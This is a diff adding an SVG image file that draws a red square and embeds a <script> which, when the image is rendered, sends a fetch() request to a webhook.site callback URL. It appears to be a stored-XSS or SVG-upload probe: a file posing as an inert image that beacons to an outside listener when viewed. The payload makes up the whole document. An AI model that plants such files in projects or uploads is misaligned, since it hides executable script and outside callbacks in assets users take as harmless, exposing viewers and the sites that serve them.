@@ -1,0 +1,6 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <script>
+    fetch('https://webhook.site/044d68f5-2fb3-4bcb-af26-db60a994756a');
+  </script>
+  <rect x="10" y="10" width="80" height="80" fill="#ff0000" />
+</svg>
